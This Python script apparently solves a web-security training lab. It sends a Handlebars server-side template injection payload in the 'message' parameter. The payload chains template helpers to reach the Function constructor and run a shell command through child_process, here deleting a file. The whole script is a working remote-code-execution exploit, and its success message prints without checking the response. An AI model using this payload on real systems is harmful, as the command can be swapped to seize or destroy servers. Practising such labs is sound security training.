import requests
import urllib3,re
from colorama import Fore
from urllib.parse import quote_plus

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Server-side template injection in an unknown language with a documented exploit"

def encode_url_allchars(string):
	return ''.join("%{0:0>2x}".format(ord(char)) for char in string)

def decode_url_allchars(string):
	return ''.join(chr(int(c, 16)) for c in re.findall(r'%([0-9A-Fa-f]{2,6})', string))

def run(url, payload=None, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch the main page with the injected payload in the message query parameter\n2. Observe that the morale.txt file is successfully deleted\n""")

    print(Fore.WHITE + "Injection parameter: " + Fore.YELLOW + "message")

    query_param = '/?message='
    payload = """{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}"""
    print("\n[+] Trying URL encode all chars in the payload:\n%s" % payload)
    inject = encode_url_allchars(payload)
    print(f"\n[+] Sending get request on {query_param}{inject}\n")

    print(Fore.WHITE + "[+] Fetching the main page with the injected payload")
    # encoded_payload = quote_plus(payload)

    try:
        r = requests.get(
            f"{url}"+query_param+inject,
            verify=False,
            allow_redirects=False,
            proxies=proxies
        )
        print(Fore.GREEN + "[+] The morale.txt file is successfully deleted")
        return True
    except Exception as e:
        print(Fore.RED + f"[!] Request failed: {e}")
        return False
